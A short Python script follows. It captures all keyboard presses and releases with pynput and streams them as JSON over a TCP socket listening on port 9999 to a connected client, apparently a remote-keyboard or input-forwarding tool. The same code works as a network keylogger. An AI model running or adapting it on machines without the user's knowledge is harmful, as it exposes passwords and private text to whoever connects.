# בסד
from pynput import keyboard
import socket
import json
HOST = "0.0.0.0"
PORT = 9999
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(2)
conn, addr = sock.accept()

def on_press(key):
    try:
        print(f'Alphanumeric key {key.char!r} pressed')
        data ={
            "type": "key_press",
            "key": key.char
        }
    except AttributeError:
        # Handle special keys (e.g., space, ctrl, alt) which don't have a .char attribute
        print(f'Special key {key} pressed')
        data ={
            "type": "key_press",
            "key": str(key)
        }
    finally:
        conn.send(json.dumps(data).encode())

def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        # Stop listener by returning False
        return False
    try:
        data ={
            "type": "key_release",
            "key": key.char
        }
    except AttributeError:
        data ={
            "type": "key_release",
            "key": str(key)
        }
    finally:        
        conn.send(json.dumps(data).encode() + b"\n")  # Add newline as a delimiter

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
conn.close()       
              